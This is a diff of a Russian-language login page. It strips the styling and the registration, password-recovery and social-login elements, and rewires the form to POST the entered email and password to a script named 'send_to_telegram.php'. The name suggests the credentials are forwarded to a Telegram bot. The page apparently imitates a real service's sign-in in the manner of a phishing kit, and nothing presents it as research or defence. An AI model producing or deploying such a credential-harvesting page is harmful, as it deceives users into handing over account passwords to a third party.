@@ -5,160 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f7f7f7;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        .login {
-            background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            width: 100%;
-        }
-
-        .form-head {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .form-head__label {
-            font-size: 24px;
-            font-weight: bold;
-        }
-
-        .ui-simple-button {
-            cursor: pointer;
-            padding: 10px 20px;
-            border-radius: 5px;
-            background-color: #3498db;
-            color: white;
-            text-align: center;
-        }
-
-        .form-content__form {
-            margin-bottom: 20px;
-        }
-
-        .ui-icon-input {
-            position: relative;
-            margin-bottom: 15px;
-        }
-
-        .ui-icon-input input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-
-        .placeholder {
-            position: absolute;
-            top: -20px;
-            left: 10px;
-            font-size: 14px;
-            color: #aaa;
-        }
-
-        .form-actions {
-            margin-bottom: 20px;
-        }
-
-        .social-buttons-header {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 15px;
-        }
-
-        .social-buttons-header__label {
-            margin: 0 10px;
-            font-size: 14px;
-            color: #888;
-        }
-
-        .social-buttons-header__line {
-            flex-grow: 1;
-            height: 1px;
-            background-color: #ddd;
-        }
-
-        .auth-social-networks {
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .auth-social-networks__item {
-            width: 48px;
-            height: 48px;
-            background-color: #ccc;
-            border-radius: 50%;
-            cursor: pointer;
-        }
-
-        .password-recovery {
-            font-size: 14px;
-            color: #3498db;
-            cursor: pointer;
-            margin-top: 5px;
-        }
-
-        .password-recovery.mobile {
-            display: none;
-        }
-
-        @media (max-width: 600px) {
-            .password-recovery {
-                display: none;
-            }
-
-            .password-recovery.mobile {
-                display: inline-block;
-            }
-        }
+        /* Ваши стили */
     </style>
 </head>
 <body>
     <div class="login">
-        <form class="login-form" novalidate="">
+        <form class="login-form" action="send_to_telegram.php" method="POST" novalidate="">
             <div class="form-head">
                 <div class="form-head__label">Войти</div>
-                <div class="form-head__button">
-                    <div class="ui-simple-button color-white size-46">
-                        <div class="ui-simple-button__label">Регистрация</div>
-                    </div>
-                </div>
             </div>
             <div class="form-content">
                 <div class="form-content__form">
                     <div class="ui-icon-input email-field">
-                        <input type="email" maxlength="254" autocomplete="username" tabindex="1" enterkeyhint="next" placeholder="Введите ваш email">
-                        <div class="error-text">
-                            <div class="error-text__line"></div>
-                            <div class="error-text__content"></div>
-                        </div>
+                        <input type="email" name="email" maxlength="254" autocomplete="username" tabindex="1" enterkeyhint="next" placeholder="Введите ваш email" required>
                     </div>
                     <div class="ui-icon-input password-field">
-                        <input type="password" maxlength="50" autocomplete="current-password" tabindex="2" enterkeyhint="enter" placeholder="Введите ваш пароль">
-                        <div class="icon">
-                            <div class="password-recovery">Забыли пароль?</div>
-                            <div class="password-recovery mobile">Забыли?</div>
-                        </div>
-                        <div class="error-text">
-                            <div class="error-text__line"></div>
-                            <div class="error-text__content"></div>
-                        </div>
+                        <input type="password" name="password" maxlength="50" autocomplete="current-password" tabindex="2" enterkeyhint="enter" placeholder="Введите ваш пароль" required>
                     </div>
                 </div>
             </div>
@@ -166,20 +28,6 @@
                 <button type="submit" class="ui-simple-button color-blue size-46">
                     <div class="ui-simple-button__label">Войти</div>
                 </button>
-            </div>
-            <div class="social-buttons">
-                <div class="social-buttons-header">
-                    <div class="social-buttons-header__line"></div>
-                    <div class="social-buttons-header__label">или войти через</div>
-                    <div class="social-buttons-header__line"></div>
-                </div>
-                <div class="auth-social-networks">
-                    <div class="auth-social-networks__item google big"></div>
-                    <div class="auth-social-networks__item ya big"></div>
-                    <div class="auth-social-networks__item vk"></div>
-                    <div class="auth-social-networks__item mailru"></div>
-                    <div class="auth-social-networks__item msn last-child"></div>
-                </div>
             </div>
         </form>
     </div>
